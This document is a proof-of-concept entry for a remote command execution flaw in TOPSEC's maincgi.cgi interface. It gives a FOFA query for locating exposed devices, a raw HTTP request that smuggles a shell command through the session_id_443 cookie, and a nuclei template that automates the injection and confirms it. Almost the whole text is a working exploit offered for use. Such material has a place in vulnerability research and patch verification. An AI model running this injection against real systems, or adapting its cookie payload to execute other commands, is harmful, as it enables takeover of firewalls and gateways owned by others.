## 天融信TOPSEC_maincgi.cgi远程命令执行

## fofa
```
title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
```

## poc
```
GET /cgi/maincgi.cgi?Url=check HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close
Cookie: session_id_443=1|echo 'This a vulnerability!' >> /www/htdocs/site/image/hard.txt;
```
![e5666ca9ef9cd6bfb4a912093e147e11](https://github.com/wy876/POC/assets/139549762/e4f18daa-2222-42c4-b52f-9b31e468fd44)

![image](https://github.com/wy876/POC/assets/139549762/414a2d98-4206-415b-8252-2d56b397f9e2)


## nuclei 
```
id: topsec-maincgi-rce

info:
  name: 天融信TOPSEC_maincgi.cgi远程命令执行
  author: fgz
  severity: critical
  description: 天融信TOPSEC解决方案包括综合管理系统，各类安全产品如防火墙、VPN、安全网关、宽带管理、入侵检测、内容过滤、个人安全套件以及综合安全审计系统等多种安全功能。该系统maincgi接口处存在RCE漏洞，会导致服务器失陷。
  metadata:
    max-request: 1
    fofa-query: app="天融信-上网行为管理系统",title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
    verified: true
variables:
  file_name: "{{to_lower(rand_text_alpha(6))}}"
  file_content: "{{to_lower(rand_text_alpha(15))}}"
requests:
  - raw:
      - |+
        GET /cgi/maincgi.cgi?Url=check HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
        Cookie: session_id_443=1|echo '{{file_content}}' >> /www/htdocs/site/image/{{file_name}}.txt;

      - |
        GET /site/image/{{file_name}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
```
